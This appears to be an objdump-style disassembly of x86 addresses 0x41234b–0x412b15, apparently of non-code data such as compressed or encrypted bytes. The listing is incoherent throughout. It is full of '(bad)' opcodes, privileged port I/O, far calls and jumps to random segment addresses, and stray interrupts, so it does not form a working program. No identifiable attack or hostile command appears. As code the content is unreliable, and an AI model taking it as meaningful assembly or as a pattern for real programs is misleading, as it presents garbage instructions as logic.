  41234b:	lds    esp,FWORD PTR cs:[eax+0x56]
  41234f:	adc    dl,cl
  412351:	test   dl,cl
  412353:	xor    al,0x58
  412355:	add    DWORD PTR [esi-0x46],esi
  412358:	push   ebx
  412359:	dec    edi
  41235a:	retf   0x64ab
  41235d:	xchg   BYTE PTR [ecx-0x5c],ch
  412360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412361:	dec    ebx
  412362:	and    DWORD PTR [esi+ebp*2-0x47550846],edi
  412369:	and    BYTE PTR [edx-0x7b353aa],bh
  41236f:	push   edx
  412370:	inc    esp
  412371:	inc    ebp
  412372:	and    DWORD PTR [ecx-0x7b41337],0x5e3ac0d2
  41237c:	pop    ebx
  41237d:	pop    ebx
  41237e:	inc    ecx
  41237f:	cld    
  412380:	xor    cl,dl
  412382:	pop    esi
  412383:	fld    TBYTE PTR [edx]
  412385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412386:	inc    DWORD PTR [esi+0x3a]
  412389:	aad    0x60
  41238b:	sub    dh,BYTE PTR [esi-0x4b]
  41238e:	out    0xa7,al
  412390:	retf   0xa6ea
  412393:	mov    al,ds:0x866ac1aa
  412398:	push   edi
  412399:	ins    BYTE PTR es:[edi],dx
  41239a:	jbe    0x41240e
  41239c:	ret    0xb862
  41239f:	add    eax,0xc25847b4
  4123a4:	repnz push 0xffffffeb
  4123a7:	push   esi
  4123a8:	xor    ecx,DWORD PTR [ebx+0x56]
  4123ab:	les    esi,FWORD PTR [esp+ecx*8+0x604d8883]
  4123b2:	jne    0x4123e8
  4123b4:	sbb    al,0x8d
  4123b6:	mov    bl,BYTE PTR [edx+eiz*8]
  4123b9:	sbb    al,0x70
  4123bb:	or     eax,0x7c4d4d55
  4123c0:	mov    al,ds:0xd90c5e52
  4123c5:	sahf   
  4123c6:	inc    eax
  4123c7:	imul   eax,DWORD PTR [edx-0x3b7bfaf3],0x38
  4123ce:	pop    edx
  4123cf:	adc    al,0x48
  4123d1:	pop    eax
  4123d2:	pop    ss
  4123d3:	xor    al,0x43
  4123d5:	test   DWORD PTR [ebx-0xb05efc0],eax
  4123db:	xor    DWORD PTR [esi],ecx
  4123dd:	sbb    ebp,DWORD PTR [ebp+ebp*8+0x134578]
  4123e4:	gs dec eax
  4123e6:	jns    0x4123ce
  4123e8:	call   0xf955d6b9
  4123ed:	fwait
  4123ee:	pop    ebp
  4123ef:	int    0x1e
  4123f1:	adc    al,BYTE PTR [eax-0x8]
  4123f4:	inc    ecx
  4123f5:	out    dx,al
  4123f6:	push   ss
  4123f7:	mov    ds:0x697b9856,al
  4123fc:	ins    DWORD PTR es:[edi],dx
  4123fd:	sbb    eax,0x3434e94e
  412402:	inc    ebp
  412403:	fsubr  DWORD PTR [esi]
  412405:	jne    0x4123b9
  412407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412408:	inc    ebx
  412409:	add    DWORD PTR [ecx-0x3],ebx
  41240c:	jbe    0x41244c
  41240e:	(bad)  
  41240f:	std    
  412410:	mov    ah,0xe0
  412412:	or     al,al
  412414:	ins    BYTE PTR es:[edi],dx
  412415:	sub    ch,BYTE PTR [eax-0x6b]
  412418:	shl    BYTE PTR [edx],0x2c
  41241b:	jecxz  0x4123e8
  41241d:	push   0xcc7a5e
  412422:	push   esp
  412423:	adc    BYTE PTR [eax],0x16
  412426:	lock ins BYTE PTR es:[edi],dx
  412428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412429:	or     eax,0xa78ce62a
  41242e:	and    al,BYTE PTR cs:[eax+0x59]
  412432:	dec    edx
  412433:	mov    ah,0x81
  412435:	jo     0x41243f
  412437:	or     al,0x46
  412439:	adc    DWORD PTR [edx-0x68],ecx
  41243c:	fmul   DWORD PTR [ebp+0x3ccad087]
  412442:	mov    eax,0xda93df4
  412447:	fcmovnbe st,st(0)
  412449:	pusha  
  41244a:	jp     0x412478
  41244c:	sub    eax,0xf406c35c
  412451:	push   0xb4aacdb0
  412456:	lea    esi,[eax+0x10]
  412459:	push   ecx
  41245a:	add    DWORD PTR [eax+eiz*1],0x7514d657
  412461:	sub    al,0x60
  412463:	fwait
  412464:	sbb    eax,0x9b04ed8
  412469:	xchg   DWORD PTR [edx-0x53],ebp
  41246c:	adc    ch,BYTE PTR [ebp+0x4d]
  41246f:	push   edx
  412470:	dec    DWORD PTR [esi-0x4bb5320f]
  412476:	xchg   ebx,ebx
  412478:	sub    BYTE PTR [eax-0x6],0x48
  41247c:	sahf   
  41247d:	mov    edx,0xdbce3a8f
  412482:	mov    bh,0x80
  412484:	in     eax,dx
  412485:	adc    BYTE PTR [ebx-0x66],bh
  412488:	loop   0x412486
  41248a:	xchg   dh,ah
  41248c:	or     ah,BYTE PTR [esp+esi*2]
  41248f:	pop    edx
  412490:	and    BYTE PTR [esi+0x2fa60],al
  412496:	out    dx,eax
  412497:	ror    BYTE PTR [edx],0x42
  41249a:	icebp  
  41249b:	or     esp,DWORD PTR [eax-0x48]
  41249e:	idiv   BYTE PTR [esi+ebx*2+0x6a]
  4124a2:	xchg   ebx,eax
  4124a3:	sub    eax,0xd8b8f1b0
  4124a8:	mov    bh,0xee
  4124aa:	loop   0x4124da
  4124ac:	xor    ebx,0x6a
  4124af:	pop    ebx
  4124b0:	inc    ecx
  4124b1:	xchg   esi,ebx
  4124b3:	mov    ds:0x2e367ea3,al
  4124b8:	mov    edi,0x7248dcec
  4124bd:	pop    ecx
  4124be:	in     eax,dx
  4124bf:	dec    ebx
  4124c0:	push   cs
  4124c1:	call   0xb795bf48
  4124c6:	xchg   BYTE PTR [edi],ah
  4124c8:	lods   eax,DWORD PTR ds:[esi]
  4124c9:	(bad)  
  4124ca:	dec    ebp
  4124cb:	inc    esp
  4124cc:	add    al,0xb3
  4124ce:	into   
  4124cf:	push   0xffffff88
  4124d1:	scas   eax,DWORD PTR es:[edi]
  4124d2:	bound  eax,QWORD PTR [eax]
  4124d4:	push   eax
  4124d5:	rol    DWORD PTR [edx+0x3f9033aa],1
  4124db:	sub    al,BYTE PTR [esi]
  4124dd:	shl    DWORD PTR [esi-0x4ca8a8a1],1
  4124e3:	pop    ss
  4124e4:	loopne 0x41246a
  4124e6:	pop    ebx
  4124e7:	xor    al,0x3a
  4124e9:	and    eax,0xdef2cb68
  4124ee:	pop    esi
  4124ef:	push   0x45
  4124f1:	sub    eax,0x921ad310
  4124f6:	and    bh,dh
  4124f8:	push   edx
  4124f9:	pusha  
  4124fa:	add    BYTE PTR [eax],ch
  4124fc:	inc    ebx
  4124fd:	xlat   BYTE PTR ds:[ebx]
  4124fe:	xor    eax,0x86a6c1b0
  412503:	inc    ecx
  412505:	test   al,al
  412507:	mov    WORD PTR [esi],es
  412509:	lds    eax,FWORD PTR [ebx+0x61]
  41250c:	push   ecx
  41250d:	call   0xad2c:0x22231d9e
  412514:	test   eax,0x86e6d9a1
  412519:	inc    eax
  41251a:	jbe    0x41253c
  41251c:	je     0x4124ae
  41251e:	inc    esi
  41251f:	cmp    eax,0x6c34bb70
  412524:	mov    al,0x5d
  412526:	je     0x41252a
  412528:	push   eax
  412529:	mov    dl,0x50
  41252b:	add    al,0x6b
  41252d:	mov    WORD PTR [esi],ds
  41252f:	pop    es
  412530:	jo     0x41259e
  412532:	(bad)  
  412533:	outs   dx,BYTE PTR ds:[esi]
  412534:	mov    BYTE PTR [esi+0x5e4e550f],ah
  41253a:	and    BYTE PTR [ebx+esi*1-0x2e31bde2],0x59
  412542:	rol    BYTE PTR [ecx+0xa2a1aaf],cl
  412548:	out    dx,al
  412549:	xchg   BYTE PTR [edx-0x34],bl
  41254c:	mov    es,WORD PTR [eax]
  41254e:	adc    al,0x81
  412550:	mov    edx,0xe160101
  412555:	or     dh,BYTE PTR [eax]
  412557:	inc    ebx
  412558:	mov    fs,WORD PTR [esi-0x2f]
  41255b:	in     eax,dx
  41255c:	add    dh,ch
  41255e:	(bad)  
  41255f:	pop    es
  412560:	not    al
  412562:	(bad)  
  412564:	adc    BYTE PTR [esi],ch
  412566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412567:	fnsave [edx+0x72f874a0]
  41256d:	xor    eax,0x86e9f03
  412572:	jbe    0x4125d1
  412574:	xchg   edx,eax
  412575:	jmp    0x5d5e:0x3054d158
  41257c:	or     cl,BYTE PTR [edi+esi*2+0x15598996]
  412583:	or     eax,0x26858a1f
  412588:	es jbe 0x412551
  41258b:	fisubr DWORD PTR [eax]
  41258d:	push   0x77b61270
  412592:	js     0x412576
  412594:	sub    BYTE PTR [eax],dl
  412596:	pusha  
  412597:	xor    eax,0x22e395a2
  41259d:	sub    BYTE PTR ss:[edx+0x63],cl
  4125a1:	and    al,0x6d
  4125a3:	ds icebp 
  4125a5:	push   cs
  4125a6:	push   eax
  4125a7:	push   edx
  4125a8:	mov    al,ds:0x8f8e82f9
  4125ad:	scas   al,BYTE PTR es:[edi]
  4125ae:	outs   dx,BYTE PTR ds:[esi]
  4125af:	ins    BYTE PTR es:[edi],dx
  4125b0:	iret   
  4125b1:	add    eax,0xcf55000
  4125b6:	mov    dl,0x44
  4125b8:	test   BYTE PTR ds:0xbc3a3ee8,dl
  4125be:	lods   al,BYTE PTR ds:[esi]
  4125bf:	js     0x412581
  4125c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125c2:	mov    esi,0x487a3522
  4125c7:	cmp    al,0xdc
  4125c9:	test   eax,0x15554579
  4125ce:	aaa    
  4125cf:	and    BYTE PTR [ebp+0x0],bh
  4125d2:	mov    eax,ds:0xd6e42f16
  4125d7:	xchg   BYTE PTR [edi],dh
  4125d9:	ins    DWORD PTR es:[edi],dx
  4125da:	sub    esi,DWORD PTR [eax-0x4c]
  4125dd:	bound  ebp,QWORD PTR [esi]
  4125df:	bnd js 0x412606
  4125e2:	lods   eax,DWORD PTR ds:[esi]
  4125e3:	out    dx,al
  4125e4:	push   edi
  4125e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e6:	dec    esp
  4125e7:	mov    al,ds:0x1d0d187e
  4125ec:	jmp    0x1e8e:0xe01a86ae
  4125f3:	mov    eax,ds:0xacc04d40
  4125f8:	cmp    BYTE PTR [eax],dh
  4125fa:	ret    
  4125fb:	mov    ch,0x40
  4125fd:	mov    al,0xa2
  4125ff:	clc    
  412600:	pusha  
  412601:	xor    BYTE PTR [ebx-0x2f81695f],0xca
  412608:	mov    al,ds:0xe62f6084
  41260d:	cwde   
  41260e:	cmp    eax,0xeaad822e
  412613:	sbb    edx,0xe28953f8
  412619:	retf   
  41261a:	mov    ds:0xad0676df,al
  41261f:	xor    eax,0xc4f781fb
  412624:	mov    al,cl
  412626:	add    al,0x5e
  412628:	in     al,dx
  412629:	dec    esp
  41262a:	xor    BYTE PTR [edx-0x6e02789b],0x81
  412631:	das    
  412632:	and    BYTE PTR [edi+0x21],ch
  412635:	add    BYTE PTR [ebx-0x49],dh
  412638:	out    dx,al
  412639:	mov    al,BYTE PTR [esi+0x63]
  41263c:	dec    esp
  41263d:	pusha  
  41263e:	imul   esi,DWORD PTR [esi-0x60],0xd70de0c2
  412645:	(bad)  
  412646:	cmp    ch,bh
  412648:	dec    esi
  412649:	xor    eax,0x539386
  41264e:	sub    al,BYTE PTR [esi+0x2]
  412651:	add    ch,BYTE PTR [ecx+0x5ede263c]
  412657:	inc    eax
  412658:	pusha  
  412659:	mov    bl,0x15
  41265b:	mov    es,WORD PTR [edi-0x76]
  41265e:	call   0x65e07b33
  412663:	and    dl,al
  412665:	lock pushf 
  412667:	ficomp WORD PTR [eax+0x419fe15]
  41266d:	daa    
  41266e:	aad    0xe0
  412670:	pop    esi
  412671:	dec    esi
  412672:	mov    edx,0xa2b04d6a
  412677:	push   0x39
  412679:	cli    
  41267a:	and    DWORD PTR [edi],edi
  41267c:	pushf  
  41267d:	hlt    
  41267e:	add    ebp,DWORD PTR [esi]
  412680:	mov    eax,DWORD PTR [ebx]
  412682:	add    ebp,DWORD PTR [ebp-0x15]
  412685:	sahf   
  412686:	push   edx
  412687:	xor    al,0xd2
  412689:	or     DWORD PTR [edx],0x4ba178cf
  41268f:	int    0xac
  412691:	sbb    al,0xaa
  412693:	loop   0x4126b0
  412695:	inc    esp
  412696:	int3   
  412697:	and    BYTE PTR [esi-0x4b],dl
  41269a:	imul   esp,esi,0xffffff8f
  41269d:	or     ch,BYTE PTR [ecx]
  41269f:	xor    BYTE PTR [edi],dh
  4126a1:	gs sti 
  4126a3:	dec    ecx
  4126a4:	ins    DWORD PTR es:[edi],dx
  4126a5:	clc    
  4126a6:	test   al,0xdf
  4126a8:	aam    0x78
  4126aa:	cmp    dh,bl
  4126ac:	shr    BYTE PTR [edx-0x66],1
  4126af:	pop    ecx
  4126b0:	inc    edi
  4126b1:	xor    eax,DWORD PTR [eax]
  4126b3:	imul   ebp,DWORD PTR ds:[edx+eax*8-0x7e],0xbc76080d
  4126bc:	fs adc eax,0xf0c70030
  4126c2:	jle    0x4126f9
  4126c4:	and    al,0x1b
  4126c6:	cmp    ch,BYTE PTR [esi+0x1aa66ed1]
  4126cc:	xchg   edx,eax
  4126cd:	inc    edx
  4126ce:	push   edi
  4126cf:	into   
  4126d0:	xchg   esp,eax
  4126d1:	push   esi
  4126d2:	shl    BYTE PTR ds:0xc2545414,1
  4126d8:	and    BYTE PTR [edx],dl
  4126da:	or     BYTE PTR [edx],0x53
  4126dd:	xchg   ecx,eax
  4126de:	(bad)  
  4126df:	mov    ah,0x52
  4126e1:	call   0x50b7:0x4025d355
  4126e8:	call   0x357653b1
  4126ed:	jl     0x4126fa
  4126ef:	ins    DWORD PTR es:[edi],dx
  4126f0:	cmp    DWORD PTR [edi+0xa],esp
  4126f3:	pop    ecx
  4126f4:	fadd   QWORD PTR ds:0x57cc8e08
  4126fa:	sub    dl,BYTE PTR [esi]
  4126fc:	inc    esp
  4126fd:	(bad)  
  4126fe:	mov    cs,WORD PTR [esi+0xaae59c]
  412704:	push   ecx
  412705:	sub    al,BYTE PTR [esi]
  412707:	adc    ebx,eax
  412709:	fisub  DWORD PTR [eax+0x58c42634]
  41270f:	cmp    bh,dl
  412711:	rol    DWORD PTR cs:[esi+0x63b6da33],0x30
  412719:	mov    dh,0x85
  41271b:	inc    edx
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	sub    BYTE PTR [edx-0x2a],bh
  412720:	aaa    
  412721:	add    BYTE PTR [ebx],0x47
  412724:	add    BYTE PTR [ecx-0x196e3102],bl
  41272a:	or     al,bl
  41272c:	lock and eax,0x4887cac
  412732:	mov    ds:0xf896ce73,al
  412737:	mov    ah,0xd
  412739:	out    0x2f,al
  41273b:	cld    
  41273c:	dec    ebp
  41273d:	add    BYTE PTR [edi],al
  41273f:	xor    eax,DWORD PTR [eax]
  412741:	mov    ebp,0xf6bb9ef5
  412746:	cli    
  412747:	outs   dx,BYTE PTR ds:[esi]
  412748:	sbb    DWORD PTR [eax],ecx
  41274a:	xlat   BYTE PTR ds:[ebx]
  41274b:	outs   dx,DWORD PTR ds:[esi]
  41274c:	call   0x2d3360fc
  412751:	stos   DWORD PTR es:[edi],eax
  412752:	sar    BYTE PTR [edx],0x56
  412755:	jb     0x41273f
  412757:	mov    cl,0x1e
  412759:	ss call 0xbfcd:0xd4d0b12
  412761:	mov    edi,es
  412763:	mov    WORD PTR [eax],es
  412765:	inc    eax
  412766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412767:	add    BYTE PTR [eax-0x80],al
  41276a:	adc    eax,0x3422e03e
  41276f:	iret   
  412770:	push   eax
  412771:	and    DWORD PTR [ecx+0x70],esp
  412774:	cmp    al,BYTE PTR [eax+0x72]
  412777:	(bad)  
  412778:	jo     0x4127cd
  41277a:	adc    eax,0x10f9ce0d
  41277f:	adc    BYTE PTR [edx-0x549efa0a],0x4
  412786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412787:	cli    
  412788:	and    al,0xbc
  41278a:	lods   al,BYTE PTR ds:[esi]
  41278b:	ja     0x412745
  41278d:	pop    edi
  41278e:	adc    dl,bl
  412790:	xchg   al,dh
  412792:	or     BYTE PTR [edi+0x7],ah
  412795:	adc    BYTE PTR [edx+0x686a9d04],0x15
  41279c:	push   0x52
  41279e:	add    BYTE PTR es:[ebx-0x42],0xd3
  4127a3:	cmp    BYTE PTR [ebx+0x2ed8ab35],dh
  4127a9:	or     BYTE PTR [ebx],ch
  4127ab:	add    BYTE PTR [ebx-0x54],al
  4127ae:	dec    ebx
  4127af:	outs   dx,DWORD PTR ds:[esi]
  4127b0:	lods   al,BYTE PTR cs:[esi]
  4127b2:	sub    dl,cl
  4127b4:	mov    ebp,cs
  4127b6:	or     eax,0xc0f20140
  4127bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127bc:	dec    edx
  4127bd:	add    eax,0x3e0d4d15
  4127c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127c3:	jl     0x41274e
  4127c5:	sbb    al,0x3e
  4127c7:	mov    edx,0x870dec9
  4127cc:	ins    BYTE PTR es:[edi],dx
  4127cd:	pop    eax
  4127ce:	ret    0x7eff
  4127d1:	push   0xffffffda
  4127d3:	out    0xa8,al
  4127d5:	add    BYTE PTR [ebx-0x28],bl
  4127d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d9:	fcomp  DWORD PTR [edx]
  4127db:	xchg   edx,eax
  4127dc:	jmp    0x58599199
  4127e1:	out    dx,al
  4127e2:	mov    ah,0xbd
  4127e4:	xor    BYTE PTR [ecx-0x7da92b37],0x54
  4127eb:	and    eax,DWORD PTR [esi-0x47]
  4127ee:	push   0x28
  4127f0:	jno    0x412820
  4127f2:	push   edx
  4127f3:	fwait
  4127f4:	loopne 0x4127f9
  4127f6:	je     0x412827
  4127f8:	jl     0x4127c0
  4127fa:	mov    es,WORD PTR [esi+0x61]
  4127fd:	push   cs
  4127fe:	(bad)  
  4127ff:	mov    bl,BYTE PTR [edi]
  412801:	jle    0x41287a
  412803:	and    al,0x0
  412805:	sub    esi,0xf060121a
  41280b:	pop    edx
  41280c:	imul   esi,DWORD PTR [eax],0xffffffcd
  41280f:	adc    eax,0xf8dafb7c
  412814:	jo     0x412888
  412816:	add    al,0xe5
  412818:	add    eax,0x582be615
  41281d:	jns    0x41288c
  41281f:	add    BYTE PTR [eax+0x6626b2b3],dl
  412825:	add    eax,0xaa0d15a2
  41282a:	adc    eax,esi
  41282c:	(bad)  
  41282d:	lock and bh,dh
  412830:	fldcw  WORD PTR [eax+0x55]
  412833:	inc    edx
  412834:	ret    
  412835:	call   0xb224:0xfc0adbef
  41283c:	mov    al,0x6e
  41283e:	or     BYTE PTR [ebp-0x2],bl
  412841:	mov    al,ds:0x14fa55e0
  412846:	ins    BYTE PTR es:[edi],dx
  412847:	test   al,0x28
  412849:	mov    ah,0xf1
  41284b:	xor    al,0x4e
  41284d:	and    BYTE PTR [esi+0x45cb3c52],dl
  412853:	mov    ebx,0x55c6092e
  412858:	mov    dh,0x91
  41285a:	push   0xc2f85d02
  41285f:	daa    
  412860:	or     DWORD PTR [eax+0x22d89ecd],eax
  412866:	mov    al,ds:0xf4acc222
  41286b:	cmp    BYTE PTR [eax-0x14],0x5
  41286f:	mov    ebp,0x2a7156c4
  412874:	scas   al,BYTE PTR es:[edi]
  412875:	rol    BYTE PTR [eax+0xa],1
  412878:	stos   BYTE PTR es:[edi],al
  412879:	push   edi
  41287a:	test   al,0x4c
  41287c:	push   cs
  41287d:	lods   eax,DWORD PTR ds:[esi]
  41287e:	fld    DWORD PTR [edi]
  412880:	test   al,0xd0
  412882:	push   edi
  412883:	dec    esi
  412884:	arpl   WORD PTR fs:[eax-0x399b54ba],cx
  41288b:	mov    al,ds:0xde058049
  412890:	gs daa 
  412892:	sub    BYTE PTR [esi-0x7e6c1298],ah
  412898:	lods   eax,DWORD PTR ds:[esi]
  412899:	and    al,0xe3
  41289b:	fdivr  QWORD PTR [edi-0x65]
  41289e:	jl     0x4128a6
  4128a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a1:	loop   0x41288a
  4128a3:	push   ecx
  4128a4:	jp     0x4128b9
  4128a6:	sbb    eax,0x49a84d72
  4128ab:	ret    0xb191
  4128ae:	js     0x4128ca
  4128b0:	mov    ecx,0x6b0a0928
  4128b5:	lods   eax,DWORD PTR ds:[esi]
  4128b6:	stos   DWORD PTR es:[edi],eax
  4128b7:	or     BYTE PTR [esi-0xe],ah
  4128ba:	mov    edx,0xb7e84b16
  4128bf:	retf   0x3504
  4128c2:	mov    ah,0x8a
  4128c4:	mov    bl,ch
  4128c6:	sub    bl,0x70
  4128c9:	loop   0x41284d
  4128cb:	and    eax,DWORD PTR [eax+0x263d4ba1]
  4128d1:	mov    al,0x16
  4128d3:	or     eax,0x1c8e5e2a
  4128d8:	push   eax
  4128d9:	push   ebp
  4128da:	cmp    BYTE PTR [edx+ebp*4+0x2f0cf2],ah
  4128e1:	pop    esi
  4128e2:	adc    al,0x0
  4128e4:	or     ch,BYTE PTR [esi]
  4128e6:	mov    ch,0xa6
  4128e8:	xchg   edi,eax
  4128e9:	pop    edi
  4128ea:	inc    esp
  4128eb:	dec    DWORD PTR [eax+edx*2]
  4128ee:	sub    BYTE PTR [edx+0x3a],ch
  4128f1:	push   esp
  4128f2:	fcom   DWORD PTR [edx]
  4128f4:	leave  
  4128f5:	dec    ecx
  4128f6:	enter  0x6d3f,0x53
  4128fa:	adc    ebp,DWORD PTR [esp+eax*2-0x1b]
  4128fe:	ins    BYTE PTR es:[edi],dx
  4128ff:	shr    BYTE PTR [edx-0x4a],0xb8
  412903:	iret   
  412904:	pop    ecx
  412905:	pop    eax
  412906:	int    0x4c
  412908:	push   0x135c322a
  41290d:	fs dec eax
  41290f:	add    bh,BYTE PTR [ecx-0xd443ea0]
  412915:	rol    DWORD PTR [esi+0x0],1
  412918:	adc    dh,bl
  41291a:	aad    0xe
  41291c:	jle    0x412928
  41291e:	add    dh,ah
  412920:	or     al,BYTE PTR [ecx-0x36b64e40]
  412926:	js     0x412940
  412928:	out    0xc4,al
  41292a:	xlat   BYTE PTR ds:[ebx]
  41292b:	(bad)  
  41292c:	mov    esi,0x7e4e0dac
  412931:	pop    esi
  412932:	inc    eax
  412933:	push   0xffffffc7
  412935:	loope  0x41295d
  412937:	mov    eax,ds:0xa341435
  41293c:	int    0x1e
  41293e:	jp     0x41290e
  412940:	cld    
  412941:	pop    eax
  412942:	dec    ebp
  412943:	adc    esi,DWORD PTR [ebp-0x13135e57]
  412949:	sbb    ch,BYTE PTR [ecx-0x3c]
  41294c:	dec    esi
  41294d:	mov    ds:0x536380d2,al
  412952:	shl    DWORD PTR [esi+edi*1],1
  412955:	lods   eax,DWORD PTR ds:[esi]
  412956:	cli    
  412957:	inc    ecx
  412958:	test   DWORD PTR [esi],eax
  41295a:	and    BYTE PTR [eax-0x76],bh
  41295d:	test   dl,ch
  41295f:	xchg   edx,eax
  412960:	sahf   
  412961:	pop    ss
  412962:	test   BYTE PTR [edi-0xc],bl
  412965:	sbb    eax,ebx
  412967:	dec    edx
  412968:	cmp    bh,BYTE PTR [edx-0x3c]
  41296b:	sub    al,0x48
  41296d:	add    bh,dl
  41296f:	add    cl,ah
  412971:	ins    BYTE PTR es:[edi],dx
  412972:	add    BYTE PTR [edx],ch
  412974:	sub    al,0x5
  412976:	int3   
  412977:	gs in  eax,dx
  412979:	sbb    BYTE PTR [eax+0x35aba244],0xa9
  412980:	js     0x412940
  412982:	push   edi
  412983:	or     bl,BYTE PTR [eax]
  412985:	push   eax
  412986:	mov    ds:0xa2b5018d,al
  41298b:	mov    dl,0x75
  41298d:	out    dx,al
  41298e:	call   0xbaba:0xb4e8f874
  412995:	loopne 0x41296b
  412997:	es jno 0x4129de
  41299a:	adc    al,0xd
  41299c:	cs jmp 0xbcdcee32
  4129a2:	ficom  DWORD PTR [ebx+0x4a]
  4129a5:	or     DWORD PTR [edx],ecx
  4129a7:	add    eax,DWORD PTR [esi+0x54]
  4129aa:	adc    eax,0x61e3bcd
  4129af:	ins    BYTE PTR es:[edi],dx
  4129b0:	dec    edi
  4129b1:	cmp    DWORD PTR [eax],eax
  4129b3:	je     0x412987
  4129b5:	cs cdq 
  4129b7:	sub    eax,DWORD PTR [eax]
  4129b9:	cmp    al,0xac
  4129bb:	dec    esp
  4129bc:	(bad)  
  4129bd:	retf   0x14da
  4129c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c1:	sbb    eax,0x90880ad2
  4129c6:	iret   
  4129c7:	sbb    eax,0xa3db06a0
  4129cc:	dec    ebx
  4129cd:	mov    WORD PTR [ebx],cs
  4129cf:	mov    ebx,0x82801e7
  4129d4:	inc    esp
  4129d5:	xchg   edi,eax
  4129d6:	add    ebx,eax
  4129d8:	jae    0x4129f5
  4129da:	push   cs
  4129db:	clc    
  4129dc:	aam    0xe0
  4129de:	push   eax
  4129df:	sub    edi,DWORD PTR [edx]
  4129e1:	jp     0x412987
  4129e3:	enter  0x946b,0xb2
  4129e7:	test   ah,dl
  4129e9:	xchg   BYTE PTR [esi],dh
  4129eb:	test   DWORD PTR [eax+0x6437bfe8],eax
  4129f1:	mov    ah,0xcd
  4129f3:	dec    esp
  4129f4:	sbb    edx,esi
  4129f6:	and    bh,BYTE PTR [edx]
  4129f8:	mov    ?,WORD PTR [edx+0x10]
  4129fb:	push   esp
  4129fc:	push   ds
  4129fd:	dec    eax
  4129fe:	clc    
  4129ff:	dec    eax
  412a00:	nop
  412a01:	fucom  st(1)
  412a03:	cli    
  412a04:	cmp    DWORD PTR [ebx+0x5],esi
  412a07:	adc    eax,0xf440cd82
  412a0c:	and    edi,DWORD PTR [edi+0x7e]
  412a0f:	sub    BYTE PTR [edi],dh
  412a11:	test   BYTE PTR [eax+0x6a2c04ae],ch
  412a17:	retf   0x982d
  412a1a:	mov    al,0xe6
  412a1c:	cmp    BYTE PTR [edx-0x55f4ebf5],bl
  412a22:	cmp    al,0x3a
  412a24:	add    BYTE PTR [edi],ah
  412a26:	and    dl,BYTE PTR [edx-0x10]
  412a29:	cmp    DWORD PTR [eax],0x9
  412a2c:	sbb    eax,0x9d00cd86
  412a31:	hlt    
  412a32:	imul   edi,DWORD PTR [esi],0x72
  412a35:	(bad)  
  412a36:	jne    0x412a8b
  412a38:	add    eax,0xed00d206
  412a3d:	stos   BYTE PTR es:[edi],al
  412a3e:	iret   
  412a3f:	aad    0x3
  412a41:	push   ds
  412a42:	mov    eax,ds:0x489c1a10
  412a47:	sahf   
  412a48:	xchg   esi,eax
  412a49:	push   edx
  412a4a:	lods   eax,DWORD PTR ss:[esi]
  412a4c:	mov    eax,ds:0x5cd77cc1
  412a51:	add    BYTE PTR [ecx-0x7c],bh
  412a54:	mov    dh,0x59
  412a56:	clc    
  412a57:	sbb    al,0xa
  412a59:	(bad)  
  412a5a:	inc    ecx
  412a5b:	push   ebx
  412a5c:	jo     0x4129ff
  412a5e:	mov    edi,0x67365a22
  412a63:	push   ds
  412a64:	jmp    0x8ca:0x57565c1b
  412a6b:	inc    edi
  412a6c:	test   al,bl
  412a6e:	pop    esp
  412a6f:	iret   
  412a70:	mov    dh,0x15
  412a72:	pop    ebp
  412a73:	push   eax
  412a74:	push   esp
  412a75:	or     dl,al
  412a77:	ret    
  412a78:	jl     0x412ad4
  412a7a:	in     al,0x46
  412a7c:	js     0x412a23
  412a7e:	add    eax,0x42915a05
  412a83:	dec    ebx
  412a84:	test   al,0x18
  412a86:	(bad)  
  412a87:	bound  esi,QWORD PTR [esp+esi*2+0x5c]
  412a8b:	adc    ecx,eax
  412a8d:	push   ds
  412a8e:	sbb    BYTE PTR [esi-0x57d184dc],dh
  412a94:	enter  0x2a09,0x7a
  412a98:	sub    ah,BYTE PTR [esi+0x6a]
  412a9b:	xchg   ebp,eax
  412a9c:	inc    ecx
  412a9d:	or     eax,0xa20e359e
  412aa2:	sub    BYTE PTR [edi+0x2b84c120],bl
  412aa8:	sahf   
  412aa9:	std    
  412aaa:	bound  esi,QWORD PTR [esi+0x8]
  412aad:	ins    BYTE PTR es:[edi],dx
  412aae:	int    0x3c
  412ab0:	pop    esi
  412ab1:	mov    edi,0x3c2bd776
  412ab6:	or     DWORD PTR [esi],ebp
  412ab8:	push   esi
  412ab9:	push   esi
  412aba:	inc    edi
  412abb:	rcl    DWORD PTR [edi+0x2],0xf0
  412abf:	popf   
  412ac0:	pushf  
  412ac1:	pop    ecx
  412ac2:	les    ecx,FWORD PTR [eax]
  412ac4:	in     al,dx
  412ac5:	sub    al,BYTE PTR [eax]
  412ac7:	dec    al
  412ac9:	dec    edx
  412aca:	lock add DWORD PTR ds:0x9aaed0db,esi
  412ad1:	jo     0x412a79
  412ad3:	out    0xf2,al
  412ad5:	xor    BYTE PTR [eax],ah
  412ad7:	and    cl,BYTE PTR [eax-0x57aa4f5c]
  412add:	or     eax,0xa902234
  412ae2:	adc    eax,0xfc24fad7
  412ae7:	push   es
  412ae8:	push   es
  412ae9:	loop   0x412b29
  412aeb:	out    0xf8,al
  412aed:	push   esp
  412aee:	ss xor eax,0x84b2415c
  412af4:	xchg   edx,eax
  412af5:	fld    QWORD PTR [esi+0x29]
  412af8:	cmp    ebx,DWORD PTR [edx-0x6fcb07f8]
  412afe:	call   0xc5168349
  412b03:	xchg   esp,eax
  412b04:	imul   ebx,eax,0xce9c4452
  412b0a:	or     eax,0x3aab6062
  412b0f:	sbb    bl,BYTE PTR [esp+ebp*2+0x18]
  412b13:	aaa    
  412b14:	ins    BYTE PTR es:[edi],dx
  412b15:	dec    ebp
